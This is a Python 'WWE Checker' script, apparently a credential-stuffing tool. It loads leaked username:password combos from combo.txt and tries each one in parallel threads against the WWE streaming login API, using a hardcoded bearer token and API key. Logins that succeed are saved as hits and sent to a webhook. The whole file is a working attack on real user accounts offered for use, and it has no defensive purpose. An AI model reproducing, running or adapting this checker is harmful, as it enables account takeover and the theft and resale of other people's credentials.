"""

WWE Checker

"""

import requests, os, time, queue, threading, json
from colorama import Fore

from Modules.functions import Functions, Data

# ----------------------------------------- #

cyan = Fore.CYAN
red = Fore.RED
green = Fore.GREEN
yellow = Fore.YELLOW

# ----------------------------------------- #

data = Data(0, 0, 0, 0, 0, 0)
func = Functions()

class Checker:
    def __init__(self, threads: int, accounts: list):
        self.threads = threads
        self.accounts = accounts

    def cls(self):
        os.system('cls')

    def load_accounts(self):
        with open('combo.txt', 'r', encoding='utf-8') as f:
            accounts = f.readlines()
        for i in accounts:
            self.accounts.append(i)

        return len(accounts)
    
    # ------------------------------------------- #

    def main(self):
        q = queue.Queue()
        for i in self.accounts:
            p = i.strip()
            acc = p.split(":")
            q.put(acc)

        def login(q):
            while not q.empty():
                try:
                    combo = q.get()
                    username, password = combo
                    acc = f"{username}:{password}"

                    u = "https://dce-frontoffice.imggaming.com/api/v2/login"
                    j = {"id":f"{username}","secret":f"{password}"}
                    h = {
                        "Authorization": "Bearer eyJhbGciOiJSUzI1NiIsInB1ciI6IkFVVCIsInNpZyI6ImciLCJ0eXAiOiJKV1QiLCJ2IjozfQ.eyJhcCI6eyJhcHQiOiJJRCJ9LCJhcHIiOiJJRCIsImF1ZCI6WyJkY2Uud3dlIl0sImNoayI6MTcwMjk1MDcyMiwiZGV2IjoiQlJPV1NFUiIsImVudCI6e30sImVudiI6InByb2QiLCJleHAiOjE3MDI5NTEzMjIsImd1ZSI6dHJ1ZSwiaWF0IjoxNzAyOTUwNzIyLCJpcCI6IjIxNi4xODkuMzQuMTUzIiwiaXNzIjoiZGNlLWlkIiwibG8yIjoiVVMsTmV3IFlvcmssTmV3IFlvcmssTmV3IFlvcmssMTAwMDQsMCwxLDAiLCJwYXIiOjAsInBybyI6eyJpZCI6InA3RnV2V3w4MmJjYzE5ZS1iZTJiLTRmMGQtOTg5OC01NDVlMjA5Y2I5ZjQiLCJ0cCI6ImEifSwicm9sIjoiQ1VTVE9NRVIiLCJzdWIiOiJwN0Z1dld8ODJiY2MxOWUtYmUyYi00ZjBkLTk4OTgtNTQ1ZTIwOWNiOWY0IiwidXRwIjoiSFVNQU4ifQ.LTSWGZzW_9grWoXiKPfRaLu61WuZr58iYx_I3k4JZ-3X9xVFB1VSqbVbSSN0maEx6SMgKIT4ok-CAXmQAIAYE5HFzWPRwHBdj7tUtv0yCLp7e-lcvbYzaLyugHI-TW_wMpktAdMXh-P-TrhBTFL7300nW0v-vpM8NHGuXmBWF80",
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                        "X-Api-Key": "857a1e5d-e35e-4fdf-805b-a87b6f8364bf",
                        "X-App-Var": "6.0.1.8a963ba",
                        "Realm": "dce.wwe"
                    }

                    try:
                        r = requests.post(u, json=j, headers=h)
                        
                        if "authorisationToken" in r.text:
                            print(green + f"[{func.timestamp()}] | [+] {acc}")

                            if func.hook()[0]:
                                hook = func.hook()[1]
                                func.send_hit(hook, acc)
                                
                            func.writeh("wwe", acc)
                            data.hits += 1
                        
                        elif "failedAuthentication" in r.text:
                            data.bad += 1
                            print(red + f"[{func.timestamp()}] | [-] {acc}")
                        
                        elif r.status_code == 404:
                            data.bad += 1
                            print(red + f"[{func.timestamp()}] | [-] {acc}")

                        else:
                            data.retries += 1
                            print(yellow + f"[{func.timestamp()}] | [!] {acc}")

                    except:
                        data.retries += 1
                        print(yellow + f"[{func.timestamp()}] | [!] {acc}")
                except:
                    data.retries += 1
                    print(yellow + "[!] Invalid Format")

        threads = []
        for i in range(self.threads):
            t = threading.Thread(target=login, args=(q,))
            threads.append(t)
            t.start()
        for t in threads:
            t.join()

# ----------------------------------------- #

def wwe():
    checker = Checker(0, [])
    checker.cls()

    # ------------------------------------------- #

    try:
        threads = int(input(cyan + "Threads: "))
        checker.threads = threads
        checker.cls()
    except:
        print(red + "[!] Error")
        time.sleep(1.5)
        wwe()

    # ------------------------------------------- #

    accounts = checker.load_accounts()
    input(cyan + f"Accounts: {accounts} | Threads: {checker.threads} | Press Enter To Start > ")
    print()

    # ------------------------------------------- #

    checker.main()
    func.notify(func.get_hook(), data.hits)
    input(f"\n{green}- Hits: {data.hits}\n{red}- Bad: {data.bad}\n{yellow}- Retries: {data.retries}\n\n{cyan}Press Enter To Continue > ")